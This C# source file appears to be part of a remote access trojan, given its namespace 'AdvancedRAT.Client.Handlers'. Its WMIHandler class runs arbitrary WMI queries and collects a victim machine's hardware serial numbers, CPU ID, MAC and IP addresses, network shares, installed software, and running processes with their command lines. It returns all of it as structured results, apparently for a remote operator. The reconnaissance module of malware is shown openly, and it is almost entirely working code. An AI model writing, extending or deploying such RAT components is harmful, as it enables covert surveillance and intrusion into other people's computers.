using System;
using System.Threading.Tasks;
using System.Management;
using System.Collections.Generic;

namespace AdvancedRAT.Client.Handlers
{
    public class WMIHandler
    {
        public async Task<object> ExecuteQuery(string query)
        {
            try
            {
                var results = new List<Dictionary<string, string>>();
                
                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        var item = new Dictionary<string, string>();
                        
                        foreach (PropertyData prop in obj.Properties)
                        {
                            try
                            {
                                item[prop.Name] = prop.Value?.ToString() ?? "";
                            }
                            catch { }
                        }
                        
                        results.Add(item);
                    }
                }
                
                return new { success = true, results, count = results.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetHardwareInfo()
        {
            try
            {
                var hardware = new Dictionary<string, object>
                {
                    ["bios"] = await QueryBIOS(),
                    ["motherboard"] = await QueryMotherboard(),
                    ["cpu"] = await QueryCPU(),
                    ["memory"] = await QueryMemory(),
                    ["disk"] = await QueryDisk(),
                    ["gpu"] = await QueryGPU(),
                    ["network"] = await QueryNetworkAdapters(),
                    ["usb"] = await QueryUSBDevices()
                };
                
                return new { success = true, hardware };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetSoftwareInfo()
        {
            try
            {
                var software = new List<Dictionary<string, string>>();
                
                // 설치된 프로그램 목록
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Product"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        software.Add(new Dictionary<string, string>
                        {
                            ["Name"] = obj["Name"]?.ToString(),
                            ["Version"] = obj["Version"]?.ToString(),
                            ["Vendor"] = obj["Vendor"]?.ToString(),
                            ["InstallDate"] = obj["InstallDate"]?.ToString(),
                            ["InstallLocation"] = obj["InstallLocation"]?.ToString()
                        });
                    }
                }
                
                return new { success = true, software, count = software.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetNetworkInfo()
        {
            try
            {
                var network = new Dictionary<string, object>
                {
                    ["adapters"] = await QueryNetworkAdapters(),
                    ["connections"] = await QueryNetworkConnections(),
                    ["shares"] = await QueryNetworkShares()
                };
                
                return new { success = true, network };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetProcessInfo()
        {
            try
            {
                var processes = new List<Dictionary<string, string>>();
                
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        processes.Add(new Dictionary<string, string>
                        {
                            ["ProcessId"] = obj["ProcessId"]?.ToString(),
                            ["Name"] = obj["Name"]?.ToString(),
                            ["ExecutablePath"] = obj["ExecutablePath"]?.ToString(),
                            ["CommandLine"] = obj["CommandLine"]?.ToString(),
                            ["CreationDate"] = obj["CreationDate"]?.ToString(),
                            ["WorkingSetSize"] = obj["WorkingSetSize"]?.ToString(),
                            ["ThreadCount"] = obj["ThreadCount"]?.ToString(),
                            ["HandleCount"] = obj["HandleCount"]?.ToString()
                        });
                    }
                }
                
                return new { success = true, processes, count = processes.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private async Task<List<Dictionary<string, string>>> QueryBIOS()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Manufacturer"] = obj["Manufacturer"]?.ToString(),
                            ["Name"] = obj["Name"]?.ToString(),
                            ["SerialNumber"] = obj["SerialNumber"]?.ToString(),
                            ["Version"] = obj["Version"]?.ToString(),
                            ["ReleaseDate"] = obj["ReleaseDate"]?.ToString(),
                            ["SMBIOSBIOSVersion"] = obj["SMBIOSBIOSVersion"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryMotherboard()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Manufacturer"] = obj["Manufacturer"]?.ToString(),
                            ["Product"] = obj["Product"]?.ToString(),
                            ["SerialNumber"] = obj["SerialNumber"]?.ToString(),
                            ["Version"] = obj["Version"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryCPU()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Name"] = obj["Name"]?.ToString(),
                            ["Manufacturer"] = obj["Manufacturer"]?.ToString(),
                            ["MaxClockSpeed"] = obj["MaxClockSpeed"]?.ToString(),
                            ["NumberOfCores"] = obj["NumberOfCores"]?.ToString(),
                            ["NumberOfLogicalProcessors"] = obj["NumberOfLogicalProcessors"]?.ToString(),
                            ["ProcessorId"] = obj["ProcessorId"]?.ToString(),
                            ["L2CacheSize"] = obj["L2CacheSize"]?.ToString(),
                            ["L3CacheSize"] = obj["L3CacheSize"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryMemory()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Capacity"] = obj["Capacity"]?.ToString(),
                            ["Speed"] = obj["Speed"]?.ToString(),
                            ["Manufacturer"] = obj["Manufacturer"]?.ToString(),
                            ["PartNumber"] = obj["PartNumber"]?.ToString(),
                            ["SerialNumber"] = obj["SerialNumber"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryDisk()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Model"] = obj["Model"]?.ToString(),
                            ["Size"] = obj["Size"]?.ToString(),
                            ["InterfaceType"] = obj["InterfaceType"]?.ToString(),
                            ["SerialNumber"] = obj["SerialNumber"]?.ToString(),
                            ["MediaType"] = obj["MediaType"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryGPU()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Name"] = obj["Name"]?.ToString(),
                            ["AdapterRAM"] = obj["AdapterRAM"]?.ToString(),
                            ["DriverVersion"] = obj["DriverVersion"]?.ToString(),
                            ["VideoProcessor"] = obj["VideoProcessor"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryNetworkAdapters()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter WHERE NetEnabled=True"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Name"] = obj["Name"]?.ToString(),
                            ["MACAddress"] = obj["MACAddress"]?.ToString(),
                            ["Speed"] = obj["Speed"]?.ToString(),
                            ["AdapterType"] = obj["AdapterType"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryNetworkConnections()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Description"] = obj["Description"]?.ToString(),
                            ["IPAddress"] = string.Join(", ", (string[])obj["IPAddress"] ?? new string[0]),
                            ["IPSubnet"] = string.Join(", ", (string[])obj["IPSubnet"] ?? new string[0]),
                            ["DefaultIPGateway"] = string.Join(", ", (string[])obj["DefaultIPGateway"] ?? new string[0]),
                            ["DNSServerSearchOrder"] = string.Join(", ", (string[])obj["DNSServerSearchOrder"] ?? new string[0]),
                            ["DHCPEnabled"] = obj["DHCPEnabled"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryNetworkShares()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Share"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Name"] = obj["Name"]?.ToString(),
                            ["Path"] = obj["Path"]?.ToString(),
                            ["Description"] = obj["Description"]?.ToString(),
                            ["Type"] = obj["Type"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
        
        private async Task<List<Dictionary<string, string>>> QueryUSBDevices()
        {
            var results = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_USBControllerDevice"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["Dependent"] = obj["Dependent"]?.ToString()
                        });
                    }
                }
            }
            catch { }
            
            return results;
        }
    }
}
